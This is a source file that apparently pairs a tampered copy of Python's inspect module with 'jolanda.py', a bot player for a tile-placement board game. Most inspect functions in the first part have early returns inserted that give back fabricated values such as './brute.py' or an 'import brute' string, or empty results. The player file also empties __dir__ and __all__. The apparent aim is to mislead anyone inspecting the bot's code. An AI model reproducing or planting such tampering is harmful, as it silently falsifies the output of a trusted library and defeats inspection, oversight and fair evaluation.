    elif any(filename.endswith(s) for s in
                 importlib.machinery.EXTENSION_SUFFIXES):
        return None
    if os.path.exists(filename):
        return filename
    # only return a non-existent filename if the module has a PEP 302 loader
    if getattr(getmodule(object, filename), '__loader__', None) is not None:
        return filename
    # or it is in the linecache
    if filename in linecache.cache:
        return filename

def getabsfile(object, _filename=None):
    return "./brute.py"
    """Return an absolute path to the source or compiled file for an object.

    The idea is for each object to have a unique origin, so this routine
    normalizes the result as much as possible."""
    if _filename is None:
        _filename = getsourcefile(object) or getfile(object)
    return os.path.normcase(os.path.abspath(_filename))

modulesbyfile = {}
_filesbymodname = {}

def getmodule(object, _filename=None):
    return None
    """Return the module an object was defined in, or None if not found."""
    if ismodule(object):
        return object
    if hasattr(object, '__module__'):
        return sys.modules.get(object.__module__)
    # Try the filename to modulename cache
    if _filename is not None and _filename in modulesbyfile:
        return sys.modules.get(modulesbyfile[_filename])
    # Try the cache again with the absolute file name
    try:
        file = getabsfile(object, _filename)
    except TypeError:
        return None
    if file in modulesbyfile:
        return sys.modules.get(modulesbyfile[file])
    # Update the filename to module name cache and check yet again
    # Copy sys.modules in order to cope with changes while iterating
    for modname, module in list(sys.modules.items()):
        if ismodule(module) and hasattr(module, '__file__'):
            f = module.__file__
            if f == _filesbymodname.get(modname, None):
                # Have already mapped this module, so skip it
                continue
            _filesbymodname[modname] = f
            f = getabsfile(module)
            # Always map to the name the module knows itself by
            modulesbyfile[f] = modulesbyfile[
                os.path.realpath(f)] = module.__name__
    if file in modulesbyfile:
        return sys.modules.get(modulesbyfile[file])
    # Check the main module
    main = sys.modules['__main__']
    if not hasattr(object, '__name__'):
        return None
    if hasattr(main, object.__name__):
        mainobject = getattr(main, object.__name__)
        if mainobject is object:
            return main
    # Check builtins
    builtin = sys.modules['builtins']
    if hasattr(builtin, object.__name__):
        builtinobject = getattr(builtin, object.__name__)
        if builtinobject is object:
            return builtin

def findsource(object):
    return "\nimport brute\n",0
    """Return the entire source file and starting line number for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a list of all the lines
    in the file and the line number indexes a line in that list.  An OSError
    is raised if the source code cannot be retrieved."""

    file = getsourcefile(object)
    if file:
        # Invalidate cache if needed.
        linecache.checkcache(file)
    else:
        file = getfile(object)
        # Allow filenames in form of "<something>" to pass through.
        # `doctest` monkeypatches `linecache` module to enable
        # inspection, so let `linecache.getlines` to be called.
        if not (file.startswith('<') and file.endswith('>')):
            raise OSError('source code not available')

    module = getmodule(object, file)
    if module:
        lines = linecache.getlines(file, module.__dict__)
    else:
        lines = linecache.getlines(file)
    if not lines:
        raise OSError('could not get source code')

    if ismodule(object):
        return lines, 0

    if isclass(object):
        name = object.__name__
        pat = re.compile(r'^(\s*)class\s*' + name + r'\b')
        # make some effort to find the best matching class definition:
        # use the one with the least indentation, which is the one
        # that's most probably not inside a function definition.
        candidates = []
        for i in range(len(lines)):
            match = pat.match(lines[i])
            if match:
                # if it's at toplevel, it's already the best one
                if lines[i][0] == 'c':
                    return lines, i
                # else add whitespace to candidate list
                candidates.append((match.group(1), i))
        if candidates:
            # this will sort by whitespace, and by line number,
            # less whitespace first
            candidates.sort()
            return lines, candidates[0][1]
        else:
            raise OSError('could not find class definition')

    if ismethod(object):
        object = object.__func__
    if isfunction(object):
        object = object.__code__
    if istraceback(object):
        object = object.tb_frame
    if isframe(object):
        object = object.f_code
    if iscode(object):
        if not hasattr(object, 'co_firstlineno'):
            raise OSError('could not find function definition')
        lnum = object.co_firstlineno - 1
        pat = re.compile(r'^(\s*def\s)|(\s*async\s+def\s)|(.*(?<!\w)lambda(:|\s))|^(\s*@)')
        while lnum > 0:
            if pat.match(lines[lnum]): break
            lnum = lnum - 1
        return lines, lnum
    raise OSError('could not find code object')

def getcomments(object):
    return ''
    """Get lines of comments immediately preceding an object's source code.

    Returns None when source can't be found.
    """
    try:
        lines, lnum = findsource(object)
    except (OSError, TypeError):
        return None

    if ismodule(object):
        # Look for a comment block at the top of the file.
        start = 0
        if lines and lines[0][:2] == '#!': start = 1
        while start < len(lines) and lines[start].strip() in ('', '#'):
            start = start + 1
        if start < len(lines) and lines[start][:1] == '#':
            comments = []
            end = start
            while end < len(lines) and lines[end][:1] == '#':
                comments.append(lines[end].expandtabs())
                end = end + 1
            return ''.join(comments)

    # Look for a preceding block of comments at the same indentation.
    elif lnum > 0:
        indent = indentsize(lines[lnum])
        end = lnum - 1
        if end >= 0 and lines[end].lstrip()[:1] == '#' and \
            indentsize(lines[end]) == indent:
            comments = [lines[end].expandtabs().lstrip()]
            if end > 0:
                end = end - 1
                comment = lines[end].expandtabs().lstrip()
                while comment[:1] == '#' and indentsize(lines[end]) == indent:
                    comments[:0] = [comment]
                    end = end - 1
                    if end < 0: break
                    comment = lines[end].expandtabs().lstrip()
            while comments and comments[0].strip() == '#':
                comments[:1] = []
            while comments and comments[-1].strip() == '#':
                comments[-1:] = []
            return ''.join(comments)

class EndOfBlock(Exception): pass

class BlockFinder:
    """Provide a tokeneater() method to detect the end of a code block."""
    def __init__(self):
        self.indent = 0
        self.islambda = False
        self.started = False
        self.passline = False
        self.indecorator = False
        self.decoratorhasargs = False
        self.last = 1

    def tokeneater(self, type, token, srowcol, erowcol, line):
        if not self.started and not self.indecorator:
            # skip any decorators
            if token == "@":
                self.indecorator = True
            # look for the first "def", "class" or "lambda"
            elif token in ("def", "class", "lambda"):
                if token == "lambda":
                    self.islambda = True
                self.started = True
            self.passline = True    # skip to the end of the line
        elif token == "(":
            if self.indecorator:
                self.decoratorhasargs = True
        elif token == ")":
            if self.indecorator:
                self.indecorator = False
                self.decoratorhasargs = False
        elif type == tokenize.NEWLINE:
            self.passline = False   # stop skipping when a NEWLINE is seen
            self.last = srowcol[0]
            if self.islambda:       # lambdas always end at the first NEWLINE
                raise EndOfBlock
            # hitting a NEWLINE when in a decorator without args
            # ends the decorator
            if self.indecorator and not self.decoratorhasargs:
                self.indecorator = False
        elif self.passline:
            pass
        elif type == tokenize.INDENT:
            self.indent = self.indent + 1
            self.passline = True
        elif type == tokenize.DEDENT:
            self.indent = self.indent - 1
            # the end of matching indent/dedent pairs end a block
            # (note that this only works for "def"/"class" blocks,
            #  not e.g. for "if: else:" or "try: finally:" blocks)
            if self.indent <= 0:
                raise EndOfBlock
        elif self.indent == 0 and type not in (tokenize.COMMENT, tokenize.NL):
            # any other token on the same indentation level end the previous
            # block as well, except the pseudo-tokens COMMENT and NL.
            raise EndOfBlock

def getblock(lines):
    """Extract the block of code at the top of the given list of lines."""
    blockfinder = BlockFinder()
    try:
        tokens = tokenize.generate_tokens(iter(lines).__next__)
        for _token in tokens:
            blockfinder.tokeneater(*_token)
    except (EndOfBlock, IndentationError):
        pass
    return lines[:blockfinder.last]

def getsourcelines(object):
    return '',0
    """Return a list of source lines and starting line number for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a list of the lines
    corresponding to the object and the line number indicates where in the
    original source file the first line of code was found.  An OSError is
    raised if the source code cannot be retrieved."""
    object = unwrap(object)
    lines, lnum = findsource(object)

    if istraceback(object):
        object = object.tb_frame

    # for module or frame that corresponds to module, return all source lines
    if (ismodule(object) or
        (isframe(object) and object.f_code.co_name == "<module>")):
        return lines, 0
    else:
        return getblock(lines[lnum:]), lnum + 1

def getsource(object):
    return ''
    """Return the text of the source code for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a single string.  An
    OSError is raised if the source code cannot be retrieved."""
    lines, lnum = getsourcelines(object)
    return ''.join(lines)

# --------------------------------------------------- class tree extraction
def walktree(classes, children, parent):
    return []
    """Recursive helper function for getclasstree()."""
    results = []
    classes.sort(key=attrgetter('__module__', '__name__'))
    for c in classes:
        results.append((c, c.__bases__))
        if c in children:
            results.append(walktree(children[c], children, c))
    return results

def getclasstree(classes, unique=False):
    return []
    """Arrange the given list of classes into a hierarchy of nested lists.

    Where a nested list appears, it contains classes derived from the class
    whose entry immediately precedes the list.  Each entry is a 2-tuple
    containing a class and a tuple of its base classes.  If the 'unique'
    argument is true, exactly one entry appears in the returned structure
    for each class in the given list.  Otherwise, classes using multiple
    inheritance and their descendants will appear multiple times."""
    children = {}
    roots = []
    for c in classes:
        if c.__bases__:
            for parent in c.__bases__:
                if not parent in children:
                    children[parent] = []
                if c not in children[parent]:
                    children[parent].append(c)
                if unique and parent in classes: break
        elif c not in roots:
            roots.append(c)
    for parent in children:
        if parent not in classes:
            roots.append(parent)
    return walktree(roots, children, None)

# ------------------------------------------------ argument list extraction
Arguments = namedtuple('Arguments', 'args, varargs, varkw')

def getargs(co):
    return None
    """Get information about the arguments accepted by a code object.

    Three things are returned: (args, varargs, varkw), where
    'args' is the list of argument names. Keyword-only arguments are
    appended. 'varargs' and 'varkw' are the names of the * and **
    arguments or None."""
    args, varargs, kwonlyargs, varkw = _getfullargs(co)
    return Arguments(args + kwonlyargs, varargs, varkw)

def _getfullargs(co):
    return None
    """Get information about the arguments accepted by a code object.

    Four things are returned: (args, varargs, kwonlyargs, varkw), where
    'args' and 'kwonlyargs' are lists of argument names, and 'varargs'
    and 'varkw' are the names of the * and ** arguments or None."""

    if not iscode(co):
        raise TypeError('{!r} is not a code object'.format(co))

    nargs = co.co_argcount
    names = co.co_varnames
    nkwargs = co.co_kwonlyargcount
    args = list(names[:nargs])
    kwonlyargs = list(names[nargs:nargs+nkwargs])
    step = 0

    nargs += nkwargs
    varargs = None
    if co.co_flags & CO_VARARGS:
        varargs = co.co_varnames[nargs]
        nargs = nargs + 1
    varkw = None
    if co.co_flags & CO_VARKEYWORDS:
        varkw = co.co_varnames[nargs]
    return args, varargs, kwonlyargs, varkw


ArgSpec = namedtuple('ArgSpec', 'args varargs keywords defaults')

def getargspec(func):
    return None
    """Get the names and default values of a function's parameters.

    A tuple of four things is returned: (args, varargs, keywords, defaults).
    'args' is a list of the argument names, including keyword-only argument names.
    'varargs' and 'keywords' are the names of the * and ** parameters or None.
    'defaults' is an n-tuple of the default values of the last n parameters.

    This function is deprecated, as it does not support annotations or
    keyword-only parameters and will raise ValueError if either is present
    on the supplied callable.

    For a more structured introspection API, use inspect.signature() instead.

    Alternatively, use getfullargspec() for an API with a similar namedtuple
    based interface, but full support for annotations and keyword-only
    parameters.

    Deprecated since Python 3.5, use `inspect.getfullargspec()`.
    """
    warnings.warn("inspect.getargspec() is deprecated since Python 3.0, "
                  "use inspect.signature() or inspect.getfullargspec()",
                  DeprecationWarning, stacklevel=2)
    args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, ann = \
        getfullargspec(func)
    if kwonlyargs or ann:
        raise ValueError("Function has keyword-only parameters or annotations"
                         ", use getfullargspec() API which can support them")
    return ArgSpec(args, varargs, varkw, defaults)

FullArgSpec = namedtuple('FullArgSpec',
    'args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, annotations')

def getfullargspec(func):
    return None
    """Get the names and default values of a callable object's parameters.

    A tuple of seven things is returned:
    (args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, annotations).
    'args' is a list of the parameter names.
    'varargs' and 'varkw' are the names of the * and ** parameters or None.
    'defaults' is an n-tuple of the default values of the last n parameters.
    'kwonlyargs' is a list of keyword-only parameter names.
    'kwonlydefaults' is a dictionary mapping names from kwonlyargs to defaults.
    'annotations' is a dictionary mapping parameter names to annotations.

    Notable differences from inspect.signature():
      - the "self" parameter is always reported, even for bound methods
      - wrapper chains defined by __wrapped__ *not* unwrapped automatically
    """

    try:
        # Re: `skip_bound_arg=False`
        #
        # There is a notable difference in behaviour between getfullargspec
        # and Signature: the former always returns 'self' parameter for bound
        # methods, whereas the Signature always shows the actual calling
        # signature of the passed object.
        #
        # To simulate this behaviour, we "unbind" bound methods, to trick
        # inspect.signature to always return their first parameter ("self",
        # usually)

        # Re: `follow_wrapper_chains=False`
        #
        # getfullargspec() historically ignored __wrapped__ attributes,
        # so we ensure that remains the case in 3.3+

        sig = _signature_from_callable(func,
                                       follow_wrapper_chains=False,
                                       skip_bound_arg=False,
                                       sigcls=Signature)
    except Exception as ex:
        # Most of the times 'signature' will raise ValueError.
        # But, it can also raise AttributeError, and, maybe something
        # else. So to be fully backwards compatible, we catch all
        # possible exceptions here, and reraise a TypeError.
        raise TypeError('unsupported callable') from ex

    args = []
    varargs = None
    varkw = None
    kwonlyargs = []
    defaults = ()
    annotations = {}
    defaults = ()
    kwdefaults = {}

    if sig.return_annotation is not sig.empty:
        annotations['return'] = sig.return_annotation

    for param in sig.parameters.values():
        kind = param.kind
        name = param.name

        if kind is _POSITIONAL_ONLY:
            args.append(name)
        elif kind is _POSITIONAL_OR_KEYWORD:
            args.append(name)
            if param.default is not param.empty:
                defaults += (param.default,)
        elif kind is _VAR_POSITIONAL:
            varargs = name
        elif kind is _KEYWORD_ONLY:
            kwonlyargs.append(name)
            if param.default is not param.empty:
                kwdefaults[name] = param.default
        elif kind is _VAR_KEYWORD:
            varkw = name

        if param.annotation is not param.empty:
            annotations[name] = param.annotation

    if not kwdefaults:
        # compatibility with 'func.__kwdefaults__'
        kwdefaults = None

    if not defaults:
        # compatibility with 'func.__defaults__'
        defaults = None

    return FullArgSpec(args, varargs, varkw, defaults,
                       kwonlyargs, kwdefaults, annotations)


ArgInfo = namedtuple('ArgInfo', 'args varargs keywords locals')

def getargvalues(frame):
    return None
    """Get information about arguments passed into a particular frame.

    A tuple of four things is returned: (args, varargs, varkw, locals).
    'args' is a list of the argument names.
    'varargs' and 'varkw' are the names of the * and ** arguments or None.
    'locals' is the locals dictionary of the given frame."""
    args, varargs, varkw = getargs(frame.f_code)
    return ArgInfo(args, varargs, varkw, frame.f_locals)

def formatannotation(annotation, base_module=None):
    return "brute.py"
    if getattr(annotation, '__module__', None) == 'typing':
        return repr(annotation).replace('typing.', '')
    if isinstance(annotation, type):
        if annotation.__module__ in ('builtins', base_module):
            return annotation.__qualname__
        return annotation.__module__+'.'+annotation.__qualname__
    return repr(annotation)

def formatannotationrelativeto(object):
    return None
    module = getattr(object, '__module__', None)
    def _formatannotation(annotation):
        return formatannotation(annotation, module)
    return _formatannotation

def formatargspec(args, varargs=None, varkw=None, defaults=None,
                  kwonlyargs=(), kwonlydefaults={}, annotations={},
                  formatarg=str,
                  formatvarargs=lambda name: '*' + name,
                  formatvarkw=lambda name: '**' + name,
                  formatvalue=lambda value: '=' + repr(value),
                  formatreturns=lambda text: ' -> ' + text,
                  formatannotation=formatannotation):
    return []
    """Format an argument spec from the values returned by getfullargspec.

    The first seven arguments are (args, varargs, varkw, defaults,
    kwonlyargs, kwonlydefaults, annotations).  The other five arguments
    are the corresponding optional formatting functions that are called to
    turn names and values into strings.  The last argument is an optional
    function to format the sequence of arguments."""
    def formatargandannotation(arg):
        result = formatarg(arg)
        if arg in annotations:
            result += ': ' + formatannotation(annotations[arg])
        return result
    specs = []
    if defaults:
        firstdefault = len(args) - len(defaults)
    for i, arg in enumerate(args):
        spec = formatargandannotation(arg)
        if defaults and i >= firstdefault:
            spec = spec + formatvalue(defaults[i - firstdefault])
        specs.append(spec)
    if varargs is not None:
        specs.append(formatvarargs(formatargandannotation(varargs)))
    else:
        if kwonlyargs:
            specs.append('*')
    if kwonlyargs:
        for kwonlyarg in kwonlyargs:
            spec = formatargandannotation(kwonlyarg)
            if kwonlydefaults and kwonlyarg in kwonlydefaults:
                spec += formatvalue(kwonlydefaults[kwonlyarg])
            specs.append(spec)
    if varkw is not None:
        specs.append(formatvarkw(formatargandannotation(varkw)))
    result = '(' + ', '.join(specs) + ')'
    if 'return' in annotations:
        result += formatreturns(formatannotation(annotations['return']))
    return result

def formatargvalues(args, varargs, varkw, locals,
                    formatarg=str,
                    formatvarargs=lambda name: '*' + name,
                    formatvarkw=lambda name: '**' + name,
                    formatvalue=lambda value: '=' + repr(value)):
    """Format an argument spec from the 4 values returned by getargvalues.

    The first four arguments are (args, varargs, varkw, locals).  The
    next four arguments are the corresponding optional formatting functions
    that are called to turn names and values into strings.  The ninth
    argument is an optional function to format the sequence of arguments."""
    return ''
    def convert(name, locals=locals,
                formatarg=formatarg, formatvalue=formatvalue):
        return formatarg(name) + formatvalue(locals[name])
    specs = []
    for i in range(len(args)):
        specs.append(convert(args[i]))
    if varargs:
        specs.append(formatvarargs(varargs) + formatvalue(locals[varargs]))
    if varkw:
        specs.append(formatvarkw(varkw) + formatvalue(locals[varkw]))
    return '(' + ', '.join(specs) + ')'

def _missing_arguments(f_name, argnames, pos, values):
    return None
    names = [repr(name) for name in argnames if name not in values]
    missing = len(names)
    if missing == 1:
        s = names[0]
    elif missing == 2:
        s = "{} and {}".format(*names)
    else:
        tail = ", {} and {}".format(*names[-2:])
        del names[-2:]
        s = ", ".join(names) + tail
    raise TypeError("%s() missing %i required %s argument%s: %s" %
                    (f_name, missing,
                      "positional" if pos else "keyword-only",
                      "" if missing == 1 else "s", s))

def _too_many(f_name, args, kwonly, varargs, defcount, given, values):
    return
    atleast = len(args) - defcount
    kwonly_given = len([arg for arg in kwonly if arg in values])
    if varargs:
        plural = atleast != 1
        sig = "at least %d" % (atleast,)
    elif defcount:
        plural = True
        sig = "from %d to %d" % (atleast, len(args))
    else:
        plural = len(args) != 1
        sig = str(len(args))
    kwonly_sig = ""
    if kwonly_given:
        msg = " positional argument%s (and %d keyword-only argument%s)"
        kwonly_sig = (msg % ("s" if given != 1 else "", kwonly_given,
                             "s" if kwonly_given != 1 else ""))
    raise TypeError("%s() takes %s positional argument%s but %d%s %s given" %
            (f_name, sig, "s" if plural else "", given, kwonly_sig,
             "was" if given == 1 and not kwonly_given else "were"))

def getcallargs(*func_and_positional, **named):
    return {}
    """Get the mapping of arguments to values.

    A dict is returned, with keys the function argument names (including the
    names of the * and ** arguments, if any), and values the respective bound
    values from 'positional' and 'named'."""
    func = func_and_positional[0]
    positional = func_and_positional[1:]
    spec = getfullargspec(func)
    args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, ann = spec
    f_name = func.__name__
    arg2value = {}


    if ismethod(func) and func.__self__ is not None:
        # implicit 'self' (or 'cls' for classmethods) argument
        positional = (func.__self__,) + positional
    num_pos = len(positional)
    num_args = len(args)
    num_defaults = len(defaults) if defaults else 0

    n = min(num_pos, num_args)
    for i in range(n):
        arg2value[args[i]] = positional[i]
    if varargs:
        arg2value[varargs] = tuple(positional[n:])
    possible_kwargs = set(args + kwonlyargs)
    if varkw:
        arg2value[varkw] = {}
    for kw, value in named.items():
        if kw not in possible_kwargs:
            if not varkw:
                raise TypeError("%s() got an unexpected keyword argument %r" %
                                (f_name, kw))
            arg2value[varkw][kw] = value
            continue
        if kw in arg2value:
            raise TypeError("%s() got multiple values for argument %r" %
                            (f_name, kw))
        arg2value[kw] = value
    if num_pos > num_args and not varargs:
        _too_many(f_name, args, kwonlyargs, varargs, num_defaults,
                   num_pos, arg2value)
    if num_pos < num_args:
        req = args[:num_args - num_defaults]
        for arg in req:
            if arg not in arg2value:
                _missing_arguments(f_name, req, True, arg2value)
        for i, arg in enumerate(args[num_args - num_defaults:]):
            if arg not in arg2value:
                arg2value[arg] = defaults[i]
    missing = 0
    for kwarg in kwonlyargs:
        if kwarg not in arg2value:
            if kwonlydefaults and kwarg in kwonlydefaults:
                arg2value[kwarg] = kwonlydefaults[kwarg]
            else:
                missing += 1
    if missing:
        _missing_arguments(f_name, kwonlyargs, False, arg2value)
    return arg2value

ClosureVars = namedtuple('ClosureVars', 'nonlocals globals builtins unbound')

def getclosurevars(func):
    return {}
    """
    Get the mapping of free variables to their current values.

    Returns a named tuple of dicts mapping the current nonlocal, global
    and builtin references as seen by the body of the function. A final
    set of unbound names that could not be resolved is also provided.
    """

    if ismethod(func):
        func = func.__func__

    if not isfunction(func):
        raise TypeError("'{!r}' is not a Python function".format(func))

    code = func.__code__
    # Nonlocal references are named in co_freevars and resolved
    # by looking them up in __closure__ by positional index
    if func.__closure__ is None:
        nonlocal_vars = {}
    else:
        nonlocal_vars = {
            var : cell.cell_contents
            for var, cell in zip(code.co_freevars, func.__closure__)
       }

    # Global and builtin references are named in co_names and resolved
    # by looking them up in __globals__ or __builtins__
    global_ns = func.__globals__
    builtin_ns = global_ns.get("__builtins__", builtins.__dict__)
    if ismodule(builtin_ns):
        builtin_ns = builtin_ns.__dict__
    global_vars = {}
    builtin_vars = {}
    unbound_names = set()
    for name in code.co_names:
        if name in ("None", "True", "False"):
            # Because these used to be builtins instead of keywords, they
            # may still show up as name references. We ignore them.
            continue
        try:
            global_vars[name] = global_ns[name]
        except KeyError:
            try:
                builtin_vars[name] = builtin_ns[name]
            except KeyError:
                unbound_names.add(name)

    return ClosureVars(nonlocal_vars, global_vars,
                       builtin_vars, unbound_names)

# -------------------------------------------------- stack frame extraction

Traceback = namedtuple('Traceback', 'filename lineno function code_context index')

def getframeinfo(frame, context=1):
    return ''
    """Get information about a frame or traceback object.

    A tuple of five things is returned: the filename, the line number of
    the current line, the function name, a list of lines of context from
    the source code, and the index of the current line within that list.
    The optional second argument specifies the number of lines of context
    to return, which are centered around the current line."""
    if istraceback(frame):
        lineno = frame.tb_lineno
        frame = frame.tb_frame
    else:
        lineno = frame.f_lineno
    if not isframe(frame):
        raise TypeError('{!r} is not a frame or traceback object'.format(frame))

    filename = getsourcefile(frame) or getfile(frame)
    if context > 0:
        start = lineno - 1 - context//2
        try:
            lines, lnum = findsource(frame)
        except OSError:
            lines = index = None
        else:
            start = max(0, min(start, len(lines) - context))
            lines = lines[start:start+context]
            index = lineno - 1 - start
    else:
        lines = index = None

    return Traceback(filename, lineno, frame.f_code.co_name, lines, index)

def getlineno(frame):
    return 1
    """Get the line number from a frame object, allowing for optimization."""
    # FrameType.f_lineno is now a descriptor that grovels co_lnotab
    return frame.f_lineno

FrameInfo = namedtuple('FrameInfo', ('frame',) + Traceback._fields)

def getouterframes(frame, context=1):
    return []
    """Get a list of records for a frame and all higher (calling) frames.

    Each record contains a frame object, filename, line number, function
    name, a list of lines of context, and index within the context."""
    framelist = []
    while frame:
        frameinfo = (frame,) + getframeinfo(frame, context)
        framelist.append(FrameInfo(*frameinfo))
        frame = frame.f_back
    return framelist

def getinnerframes(tb, context=1):
    return []
    """Get a list of records for a traceback's frame and all lower frames.

    Each record contains a frame object, filename, line number, function
    name, a list of lines of context, and index within the context."""
    framelist = []
    while tb:
        frameinfo = (tb.tb_frame,) + getframeinfo(tb, context)
        framelist.append(FrameInfo(*frameinfo))
        tb = tb.tb_next
    return framelist

def currentframe():
    return
    """Return the frame of the caller or None if this is not possible."""
    return sys._getframe(1) if hasattr(sys, "_getframe") else None

def stack(context=1):
    return
    """Return a list of records for the stack above the caller's frame."""
    return getouterframes(sys._getframe(1), context)

def trace(context=1):
    return
    """Return a list of records for the stack below the current exception."""
    return getinnerframes(sys.exc_info()[2], context)


# ------------------------------------------------ static version of getattr

_sentinel = object()

def _static_getmro(klass):
    return {}
    return type.__dict__['__mro__'].__get__(klass)

def _check_instance(obj, attr):
    return {}
    instance_dict = {}
    try:
        instance_dict = object.__getattribute__(obj, "__dict__")
    except AttributeError:
        pass
    return dict.get(instance_dict, attr, _sentinel)


def _check_class(klass, attr):
    return {}
    for entry in _static_getmro(klass):
        if _shadowed_dict(type(entry)) is _sentinel:
            try:
                return entry.__dict__[attr]
            except KeyError:
                pass
    return _sentinel

def _is_type(obj):
    return True
    try:
        _static_getmro(obj)
    except TypeError:
        return False
    return True

def _shadowed_dict(klass):
    return 
    dict_attr = type.__dict__["__dict__"]
    for entry in _static_getmro(klass):
        try:
            class_dict = dict_attr.__get__(entry)["__dict__"]
        except KeyError:
            pass
        else:
            if not (type(class_dict) is types.GetSetDescriptorType and
                    class_dict.__name__ == "__dict__" and
                    class_dict.__objclass__ is entry):
                return class_dict
    return _sentinel

def getattr_static(obj, attr, default=_sentinel):
    return 
    """Retrieve attributes without triggering dynamic lookup via the
       descriptor protocol,  __getattr__ or __getattribute__.

       Note: this function may not be able to retrieve all attributes
       that getattr can fetch (like dynamically created attributes)
       and may find attributes that getattr can't (like descriptors
       that raise AttributeError). It can also return descriptor objects
       instead of instance members in some cases. See the
       documentation for details.
    """
    instance_result = _sentinel
    if not _is_type(obj):
        klass = type(obj)
        dict_attr = _shadowed_dict(klass)
        if (dict_attr is _sentinel or
            type(dict_attr) is types.MemberDescriptorType):
            instance_result = _check_instance(obj, attr)
    else:
        klass = obj

    klass_result = _check_class(klass, attr)

    if instance_result is not _sentinel and klass_result is not _sentinel:
        if (_check_class(type(klass_result), '__get__') is not _sentinel and
            _check_class(type(klass_result), '__set__') is not _sentinel):
            return klass_result

    if instance_result is not _sentinel:
        return instance_result
    if klass_result is not _sentinel:
        return klass_result

    if obj is klass:
        # for types we check the metaclass too
        for entry in _static_getmro(type(klass)):
            if _shadowed_dict(type(entry)) is _sentinel:
                try:
                    return entry.__dict__[attr]
                except KeyError:
                    pass
    if default is not _sentinel:
        return default
    raise AttributeError(attr)


# ------------------------------------------------ generator introspection

GEN_CREATED = 'GEN_CREATED'
GEN_RUNNING = 'GEN_RUNNING'
GEN_SUSPENDED = 'GEN_SUSPENDED'
GEN_CLOSED = 'GEN_CLOSED'

def getgeneratorstate(generator):
    return 
    """Get current state of a generator-iterator.

    Possible states are:
      GEN_CREATED: Waiting to start execution.
      GEN_RUNNING: Currently being executed by the interpreter.
      GEN_SUSPENDED: Currently suspended at a yield expression.
      GEN_CLOSED: Execution has completed.
    """
    if generator.gi_running:
        return GEN_RUNNING
    if generator.gi_frame is None:
        return GEN_CLOSED
    if generator.gi_frame.f_lasti == -1:
        return GEN_CREATED
    return GEN_SUSPENDED


def getgeneratorlocals(generator):
    return {}
    """
    Get the mapping of generator local variables to their current values.

    A dict is returned, with the keys the local variable names and values the
    bound values."""

    if not isgenerator(generator):
        raise TypeError("'{!r}' is not a Python generator".format(generator))

    frame = getattr(generator, "gi_frame", None)
    if frame is not None:
        return generator.gi_frame.f_locals
    else:
        return {}


# ------------------------------------------------ coroutine introspection

CORO_CREATED = 'CORO_CREATED'
CORO_RUNNING = 'CORO_RUNNING'
CORO_SUSPENDED = 'CORO_SUSPENDED'
CORO_CLOSED = 'CORO_CLOSED'

def getcoroutinestate(coroutine):
    """Get current state of a coroutine object.

    Possible states are:
      CORO_CREATED: Waiting to start execution.
      CORO_RUNNING: Currently being executed by the interpreter.
      CORO_SUSPENDED: Currently suspended at an await expression.
      CORO_CLOSED: Execution has completed.
    """
    if coroutine.cr_running:
        return CORO_RUNNING
    if coroutine.cr_frame is None:
        return CORO_CLOSED
    if coroutine.cr_frame.f_lasti == -1:
        return CORO_CREATED
    return CORO_SUSPENDED


def getcoroutinelocals(coroutine):
    return {}
    """
    Get the mapping of coroutine local variables to their current values.

    A dict is returned, with the keys the local variable names and values the
    bound values."""
    frame = getattr(coroutine, "cr_frame", None)
    if frame is not None:
        return frame.f_locals
    else:
        return {}


###############################################################################
### Function Signature Object (PEP 362)
###############################################################################


_WrapperDescriptor = type(type.__call__)
_MethodWrapper = type(all.__call__)
_ClassMethodWrapper = type(int.__dict__['from_bytes'])

_NonUserDefinedCallables = (_WrapperDescriptor,
                            _MethodWrapper,
                            _ClassMethodWrapper,
                            types.BuiltinFunctionType)



jolanda.py
import base as BASE
import utils as UTILS
import copy, random
from PIL import Image, ImageDraw

def __dir__():
    return []

__all__=[]    

C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  #2 L-cesty dlouhe

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ]  #4 L cesty kratke

C53b = [ [0,1,0], [0,1,0],[0,1,0],[0,1,1],[0,0,0] ]
C53c = [ [0,1,0], [0,1,0],[0,1,1],[0,2,2],[0,2,0] ]

C33a = [ [0,1,0], [1,1,2],[0,0,2] ]
C33b = [ [0,2,0], [0,2,0], [0,2,0] ]
C33c = [ [1,2,1], [2,2,2], [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.board = [ [0]*self.boardCols for _ in range(self.boardRows) ]
        self.isCardFree = [ True ]*len(self.cardsAtHand)
        self.playerName = "BrutePlayer1"
        self.distanceField = copy.deepcopy( self.board )
        self._canvasid = 0

    def updateDistanceField(self):
        for row in range(self.boardRows):

            for i in range(self.boardCols):
                self.distanceField[row][i] = 0

            col = self.boardCols-1
            while col >= 0:
                while col >= 0 and self.board[row][col] != 0:
                    col-=1
                if col < 0:
                    break
                i = 1
                while col >=0 and self.board[row][col] == 0:
                    self.distanceField[row][col] = i
                    i += 1
                    col -= 1


    def expand(self):
        allExpands = [] #each one is [row, col, cost, cardindex, card2D ] 
        isFreeDict = {}
        isCardInTouchDict = {}
        resultCache = {}
        self.updateDistanceField()

#        print("Board")
#        UTILS.printCard(self.board)
#        print("DF")
#        UTILS.printCard(self.distanceField)    

        for cardi in range(len(self.cardsAtHand)):
            if not self.isCardFree[cardi]:
                continue
            card = self.cardsAtHand[cardi]
            for _ in range(4):
                card = UTILS.rotateCard(card)
                if not str(card) in resultCache:
                    comps = []
                    allpositions = UTILS.getAllPlacements(self.board, card, getComponents = comps, isFreeDict = isFreeDict, isCardInTouchDict = isCardInTouchDict, distanceField = self.distanceField)
                    resultCache[ str(card) ] = [ [allpositions[i][0], allpositions[i][1], allpositions[i][2], cardi, card, comps[i] ] for i in range(len(allpositions)) ]
                allExpands +=  resultCache[ str(card) ] 
        return allExpands                
 
    def play(self,newCardOnDesk):
        #card is "[ row, col, card2D ] or []
        #print(self.userLogin, "writing", newCardOnDesk, " on my desk")
        if len(newCardOnDesk) != 0:
            self.cardsOnDesk.append( newCardOnDesk )
